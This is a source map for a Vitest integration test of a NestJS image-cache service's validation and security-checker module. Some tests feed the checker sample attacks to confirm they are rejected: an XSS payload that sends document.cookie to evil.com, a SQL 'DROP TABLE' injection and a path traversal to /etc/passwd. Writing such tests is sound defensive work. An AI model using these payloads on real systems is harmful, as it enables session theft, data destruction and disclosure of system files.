{"version":3,"sources":["../../../../../src/test/Validation/integration/validation.integration.spec.ts"],"sourcesContent":["import CacheImageRequest, { ResizeOptions, SupportedResizeFormats } from '@microservice/API/dto/cache-image-request.dto'\r\nimport { ConfigModule } from '@microservice/Config/config.module'\r\nimport { CorrelationModule } from '@microservice/Correlation/correlation.module'\r\nimport { InputSanitizationService } from '@microservice/Validation/services/input-sanitization.service'\r\nimport { SecurityCheckerService } from '@microservice/Validation/services/security-checker.service'\r\nimport { SimpleValidationService } from '@microservice/Validation/services/simple-validation.service'\r\nimport { ValidationModule } from '@microservice/Validation/validation.module'\r\nimport { Test, TestingModule } from '@nestjs/testing'\r\nimport { afterEach, beforeEach, describe, expect, it } from 'vitest'\n\r\ndescribe('validation Integration', () => {\r\n\tlet module: TestingModule\r\n\tlet validationService: SimpleValidationService\r\n\tlet sanitizationService: InputSanitizationService\r\n\tlet securityChecker: SecurityCheckerService\r\n\r\n\tbeforeEach(async () => {\r\n\t\tmodule = await Test.createTestingModule({\r\n\t\t\timports: [\r\n\t\t\t\tConfigModule,\r\n\t\t\t\tCorrelationModule,\r\n\t\t\t\tValidationModule,\r\n\t\t\t],\r\n\t\t}).compile()\r\n\r\n\t\tvalidationService = module.get<SimpleValidationService>(SimpleValidationService)\r\n\t\tsanitizationService = module.get<InputSanitizationService>(InputSanitizationService)\r\n\t\tsecurityChecker = module.get<SecurityCheckerService>(SecurityCheckerService)\r\n\t})\r\n\r\n\tafterEach(async () => {\r\n\t\tawait module.close()\r\n\t})\r\n\r\n\tit('should be defined', () => {\r\n\t\texpect(validationService).toBeDefined()\r\n\t\texpect(sanitizationService).toBeDefined()\r\n\t\texpect(securityChecker).toBeDefined()\r\n\t})\r\n\r\n\tdescribe('end-to-End Validation Flow', () => {\r\n\t\tit('should validate a complete valid request', async () => {\r\n\t\t\tconst request = new CacheImageRequest({\r\n\t\t\t\tresourceTarget: 'https://localhost:3000/test-image.jpg',\r\n\t\t\t\tttl: 3600,\r\n\t\t\t\tresizeOptions: new ResizeOptions({\r\n\t\t\t\t\twidth: 800,\r\n\t\t\t\t\theight: 600,\r\n\t\t\t\t\tformat: SupportedResizeFormats.webp,\r\n\t\t\t\t\tquality: 85,\r\n\t\t\t\t}),\r\n\t\t\t})\r\n\r\n\t\t\tconst result = await validationService.validateCacheImageRequest(request)\r\n\t\t\texpect(result.isValid).toBe(true)\r\n\t\t})\r\n\r\n\t\tit('should sanitize and validate input', async () => {\r\n\t\t\tconst input = {\r\n\t\t\t\tname: 'John Doe',\r\n\t\t\t\turl: 'https://localhost:3000/image.jpg',\r\n\t\t\t\tdimensions: { width: 800, height: 600 },\r\n\t\t\t}\r\n\r\n\t\t\tconst result = await validationService.validateInput(input)\r\n\r\n\t\t\texpect(result.isValid).toBe(true)\r\n\t\t\texpect(result.sanitizedInput.name).toBe('John Doe')\r\n\t\t})\r\n\r\n\t\tit('should detect and log security events', async () => {\r\n\t\t\tconst maliciousInput = {\r\n\t\t\t\tpayload: '<script>document.location=\"http://evil.com/steal?cookie=\"+document.cookie</script>',\r\n\t\t\t}\r\n\r\n\t\t\tconst result = await validationService.validateInput(maliciousInput)\r\n\r\n\t\t\texpect(result.isValid).toBe(false)\r\n\t\t\texpect(result.errors).toContain('Input contains potentially malicious content')\r\n\t\t})\r\n\t})\r\n\r\n\tdescribe('security Features', () => {\r\n\t\tit('should detect various attack patterns', async () => {\r\n\t\t\tconst attackPatterns = [\r\n\t\t\t\t'<script>alert(\"xss\")</script>',\r\n\t\t\t\t'javascript:alert(1)',\r\n\t\t\t\t'\\'; DROP TABLE users; --',\r\n\t\t\t\t'../../../etc/passwd',\r\n\t\t\t]\r\n\r\n\t\t\tfor (const pattern of attackPatterns) {\r\n\t\t\t\tconst isMalicious = await securityChecker.checkForMaliciousContent(pattern)\r\n\t\t\t\texpect(isMalicious).toBe(true)\r\n\t\t\t}\r\n\t\t})\r\n\r\n\t\tit('should maintain security event history', async () => {\r\n\t\t\tawait securityChecker.logSecurityEvent({\r\n\t\t\t\ttype: 'malicious_content',\r\n\t\t\t\tsource: 'test',\r\n\t\t\t\tdetails: { pattern: 'xss' },\r\n\t\t\t})\r\n\r\n\t\t\tconst stats = securityChecker.getSecurityStats()\r\n\t\t\texpect(stats.totalEvents).toBeGreaterThan(0)\r\n\t\t})\r\n\t})\r\n})\n"],"names":["CacheImageRequest","ResizeOptions","SupportedResizeFormats","ConfigModule","CorrelationModule","InputSanitizationService","SecurityCheckerService","SimpleValidationService","ValidationModule","Test","afterEach","beforeEach","describe","expect","it","module","validationService","sanitizationService","securityChecker","createTestingModule","imports","compile","get","close","toBeDefined","request","resourceTarget","ttl","resizeOptions","width","height","format","webp","quality","result","validateCacheImageRequest","isValid","toBe","input","name","url","dimensions","validateInput","sanitizedInput","maliciousInput","payload","errors","toContain","attackPatterns","pattern","isMalicious","checkForMaliciousContent","logSecurityEvent","type","source","details","stats","getSecurityStats","totalEvents","toBeGreaterThan"],"mappings":"AAAA,OAAOA,qBAAqBC,aAAa,EAAEC,sBAAsB,QAAQ,0DAA+C;AACxH,SAASC,YAAY,QAAQ,+CAAoC;AACjE,SAASC,iBAAiB,QAAQ,yDAA8C;AAChF,SAASC,wBAAwB,QAAQ,yEAA8D;AACvG,SAASC,sBAAsB,QAAQ,uEAA4D;AACnG,SAASC,uBAAuB,QAAQ,wEAA6D;AACrG,SAASC,gBAAgB,QAAQ,uDAA4C;AAC7E,SAASC,IAAI,QAAuB,kBAAiB;AACrD,SAASC,SAAS,EAAEC,UAAU,EAAEC,QAAQ,EAAEC,MAAM,EAAEC,EAAE,QAAQ,SAAQ;AAEpEF,SAAS,0BAA0B;IAClC,IAAIG;IACJ,IAAIC;IACJ,IAAIC;IACJ,IAAIC;IAEJP,WAAW;QACVI,SAAS,MAAMN,KAAKU,mBAAmB,CAAC;YACvCC,SAAS;gBACRjB;gBACAC;gBACAI;aACA;QACF,GAAGa,OAAO;QAEVL,oBAAoBD,OAAOO,GAAG,CAA0Bf;QACxDU,sBAAsBF,OAAOO,GAAG,CAA2BjB;QAC3Da,kBAAkBH,OAAOO,GAAG,CAAyBhB;IACtD;IAEAI,UAAU;QACT,MAAMK,OAAOQ,KAAK;IACnB;IAEAT,GAAG,qBAAqB;QACvBD,OAAOG,mBAAmBQ,WAAW;QACrCX,OAAOI,qBAAqBO,WAAW;QACvCX,OAAOK,iBAAiBM,WAAW;IACpC;IAEAZ,SAAS,8BAA8B;QACtCE,GAAG,4CAA4C;YAC9C,MAAMW,UAAU,IAAIzB,kBAAkB;gBACrC0B,gBAAgB;gBAChBC,KAAK;gBACLC,eAAe,IAAI3B,cAAc;oBAChC4B,OAAO;oBACPC,QAAQ;oBACRC,QAAQ7B,uBAAuB8B,IAAI;oBACnCC,SAAS;gBACV;YACD;YAEA,MAAMC,SAAS,MAAMlB,kBAAkBmB,yBAAyB,CAACV;YACjEZ,OAAOqB,OAAOE,OAAO,EAAEC,IAAI,CAAC;QAC7B;QAEAvB,GAAG,sCAAsC;YACxC,MAAMwB,QAAQ;gBACbC,MAAM;gBACNC,KAAK;gBACLC,YAAY;oBAAEZ,OAAO;oBAAKC,QAAQ;gBAAI;YACvC;YAEA,MAAMI,SAAS,MAAMlB,kBAAkB0B,aAAa,CAACJ;YAErDzB,OAAOqB,OAAOE,OAAO,EAAEC,IAAI,CAAC;YAC5BxB,OAAOqB,OAAOS,cAAc,CAACJ,IAAI,EAAEF,IAAI,CAAC;QACzC;QAEAvB,GAAG,yCAAyC;YAC3C,MAAM8B,iBAAiB;gBACtBC,SAAS;YACV;YAEA,MAAMX,SAAS,MAAMlB,kBAAkB0B,aAAa,CAACE;YAErD/B,OAAOqB,OAAOE,OAAO,EAAEC,IAAI,CAAC;YAC5BxB,OAAOqB,OAAOY,MAAM,EAAEC,SAAS,CAAC;QACjC;IACD;IAEAnC,SAAS,qBAAqB;QAC7BE,GAAG,yCAAyC;YAC3C,MAAMkC,iBAAiB;gBACtB;gBACA;gBACA;gBACA;aACA;YAED,KAAK,MAAMC,WAAWD,eAAgB;gBACrC,MAAME,cAAc,MAAMhC,gBAAgBiC,wBAAwB,CAACF;gBACnEpC,OAAOqC,aAAab,IAAI,CAAC;YAC1B;QACD;QAEAvB,GAAG,0CAA0C;YAC5C,MAAMI,gBAAgBkC,gBAAgB,CAAC;gBACtCC,MAAM;gBACNC,QAAQ;gBACRC,SAAS;oBAAEN,SAAS;gBAAM;YAC3B;YAEA,MAAMO,QAAQtC,gBAAgBuC,gBAAgB;YAC9C5C,OAAO2C,MAAME,WAAW,EAAEC,eAAe,CAAC;QAC3C;IACD;AACD"}